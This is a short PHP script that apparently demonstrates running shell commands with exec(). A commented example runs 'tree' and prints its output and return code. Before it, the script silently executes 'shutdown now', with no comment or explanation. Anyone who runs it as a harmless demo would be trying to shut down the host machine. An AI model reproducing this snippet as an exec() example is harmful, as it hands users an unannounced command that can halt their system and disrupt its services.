<?php
$comm = 'shutdown now';
exec($comm);
// Command to be executed
$command = 'tree';

// Execute the command and capture the output
$output = array();
$return_var = 0;
exec($command, $output, $return_var);

// Output the results
echo "Output:\n";
echo implode("\n", $output) . "\n";
echo "Return Code: $return_var\n";
?>
